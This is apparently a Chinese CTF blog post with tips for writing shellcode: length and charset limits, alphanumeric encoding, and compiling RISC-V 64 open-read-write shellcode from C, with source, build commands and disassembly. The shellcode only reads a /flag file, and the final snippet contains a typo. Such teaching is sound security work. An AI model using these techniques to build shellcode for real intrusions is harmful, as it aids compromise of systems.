---
title: shellcode tips
tags:
  - ctf
  - pwn
  - shellcode
categories:
  - tips
date: 2021-01-30 20:53:42
excerpt: "some tips about shellcode"
---

# 前言

| 更新时间  | 更新内容  |
|  ----     | ----      |
| 2021-01-30 | 初稿     |
| 2021-01-31 | + 使用c语言构造shellcode时关于较大的立即数的处理方法 |

记录一些写shellcode相关的技巧

---

# 正文

其实平时做pwn题时遇到写shellcode题目时最常用的工具还是用pwntools的shellcraft模块, 可以方便地生成各种系统调用的shellcode. 具体使用方法可以参考官方文档: https://docs.pwntools.com/en/stable/shellcraft.html

然而pwntools不是万能的, 接下来结合具体应用场景进行分析.

## 限制shellcode长度

pwntools生成的shellcode一般都是考虑到各种可能存在的过滤(比如不能包含'\x00'), 因此长度比较长, 可以基于其进行优化. 

还有一种思路就是先构造一个read的shellcode, 读入并执行第二个getshell的shellcode, 从而实现对长度限制的绕过, 这种情况通常时需要调试分析执行shellcode时的上文, 看看寄存器或者栈上有没有什么现成的地址可供使用.

## 限制shellcode字符集

比如要求shellcode只能由字母和数字组成(这类shellcode有个专门的名词 : alphanumeric shellcode), 对于这种shellcode有一种工具: alpha3. 该工具可以将普通shellcode转化成功能相同的只由字母和数字组成的shellcode. 这个工具生成的shellcode同样是比较大的. 所以有时候还是需要自己写.

自己写alphanumeric shellcode时这个网站很有帮助: https://nets.ec/Alphanumeric_shellcode 该网站上列出了可以由字母和数字组成的指令. 方便手写时参考.

## 不同架构

有些cpu架构pwntools尚未支持, 遇到这类架构的题目需要编写shellcode时也就只能想办法手写了.  

不同架构的解决方案可能不尽相同. 笔者也就遇到过 riscv 架构的shellcode. 

## riscv shellcode

笔者之前手写shellcode时都是先手写汇编, 然后使用汇编器汇编得到机器码.

riscv 架构用汇编写shellcode的方法已经有人总结好了经验了, 不再赘述: https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html

但是这次参加完keen组织的*CTF赛后分享之后, 获知了一种更加通用的shellcode编写方法: 用C语言写shellcode. 因为该方法对于不同架构都大同小异, 通用性很强, 所以单独开一节讲.

## write shellcode in c

思路来源于enlx师傅的分享(28分36秒左右开始): https://www.youtube.com/watch?v=iQYizRu7jks

关于syscall部分思路来源于煜博师傅的exp: https://github.com/BrieflyX/ctf-pwns/blob/master/escape/favourite_architecture/workdir/shellcode2.c.

下边是个riscv64架构的orw shellcode生成过程

c源码如下:

```c
// sc.c
#include <linux/unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static char flag_path[] = "/flag";
// __attribute__((section(".text#"))) static char flag_path[] = "/flag";

int syscall(uint64_t nr, ...);

void _start(){
    char buf[0x400];
    int fd = syscall(__NR_openat, AT_FDCWD, flag_path, 0, 0);
    syscall(__NR_read, fd, buf, sizeof(buf));
    syscall(__NR_write, 1, buf, sizeof(buf));
}

asm(
    "syscall:\n"
        "mv a7, a0\n"
        "mv a0, a1\n"
        "mv a1, a2\n"
        "mv a2, a3\n"
        "mv a3, a4\n"
        "mv a4, a5\n"
        "mv a5, a6\n"
        "ecall\n"
        "ret\n"
);
```

编译命令如下:

```bash
$ riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc
```

对应gcc参数含义如下:

- -Wa,-R : -Wa表示后面的参数是传给as的, -R让as将data段合并的.text段中(`man as`for more information)
- -fPIC 表示编译得到的代码位置无关, 引用函数和全局变量时都是通过相对偏移, 而不是绝对地址
- -O0 让gcc不要优化, 测试时发现优化可能会让`_start()`函数不位于.text段开头
- -nostdlib 让gcc不链接系统标准启动文件和标准库文件，这样就不会有多余的启动代码，扣的时候更方便

编译完之后可以使用objdump确认一下字符串和`_start()`的位置:

```bash
$ riscv64-linux-gnu-objdump -d ./sc

./sc:     file format elf64-littleriscv


Disassembly of section .text:

00000000000002a0 <_start>:
 2a0:   be010113                addi    sp,sp,-1056
 2a4:   40113c23                sd      ra,1048(sp)
 2a8:   40813823                sd      s0,1040(sp)
 2ac:   42010413                addi    s0,sp,1056
 2b0:   4701                    li      a4,0
 2b2:   4681                    li      a3,0
 2b4:   00000617                auipc   a2,0x0
 2b8:   06c60613                addi    a2,a2,108 # 320 <flag_path>
 2bc:   f9c00593                li      a1,-100
 2c0:   03800513                li      a0,56
 2c4:   046000ef                jal     ra,30a <syscall>
 2c8:   87aa                    mv      a5,a0
 2ca:   fef42623                sw      a5,-20(s0)
 2ce:   be840713                addi    a4,s0,-1048
 2d2:   fec42783                lw      a5,-20(s0)
 2d6:   40000693                li      a3,1024
 2da:   863a                    mv      a2,a4
 2dc:   85be                    mv      a1,a5
 2de:   03f00513                li      a0,63
 2e2:   028000ef                jal     ra,30a <syscall>
 2e6:   be840793                addi    a5,s0,-1048
 2ea:   40000693                li      a3,1024
 2ee:   863e                    mv      a2,a5
 2f0:   4585                    li      a1,1
 2f2:   04000513                li      a0,64
 2f6:   014000ef                jal     ra,30a <syscall>
 2fa:   0001                    nop
 2fc:   41813083                ld      ra,1048(sp)
 300:   41013403                ld      s0,1040(sp)
 304:   42010113                addi    sp,sp,1056
 308:   8082                    ret

000000000000030a <syscall>:
 30a:   88aa                    mv      a7,a0
 30c:   852e                    mv      a0,a1
 30e:   85b2                    mv      a1,a2
 310:   8636                    mv      a2,a3
 312:   86ba                    mv      a3,a4
 314:   873e                    mv      a4,a5
 316:   87c2                    mv      a5,a6
 318:   00000073                ecall
 31c:   8082                    ret
 31e:   0001                    nop

0000000000000320 <flag_path>:
 320:   662f 616c 0067 0000                         /flag...
```

然后使用objcopy将.text抠出来

```bash
$ riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin
```

此时我们就得到shellcode了.

使用这种方法时对一些比较大的立即数也建议采用静态全局变量的形式, 否则可能不会被放到.text段中.

```c
// method1, success
unit64_t *addr = 0xdeadbeef00;
uint64_t *val = 0xbaadf00d;

foo(){
    *addr = val;
}

// method2, maybe fail
foo(){
    *((uint64_t *) 0xdeadbeef00) = 0xbaadf00d;
}
```

实测在riscv中使用method2时gcc会将两个立即数放到.rodata段, 且不会合并到.text段中, 不利于之后使用objcopy提取shellcode.

# 结语

总结一下, 能用pwntools就用pwntools, 不能用pwntools就尽量用C写, 实在不行再写汇编吧.

看到enlx师傅的分享时不由得感叹我对c语言的了解真的只是一些皮毛. 

# 参考

- [shellcraft -- pwntools documentation](https://docs.pwntools.com/en/stable/shellcraft.html)
- [alphanumeric shellcode](https://nets.ec/Alphanumeric_shellcode)

- [Basic Shellcode in RISC-V Linux](https://thomask.sdf.org/blog/2018/08/25/basic-shellcode-in-riscv-linux.html)

- [科恩高校合作传统pwn方向第一次活动 -- youtube](https://www.youtube.com/watch?v=iQYizRu7jks)
- [BrieflyX: Favourite Architecture II - Startctf 2021 -- github](https://github.com/BrieflyX/ctf-pwns/blob/master/escape/favourite_architecture/workdir/shellcode2.c)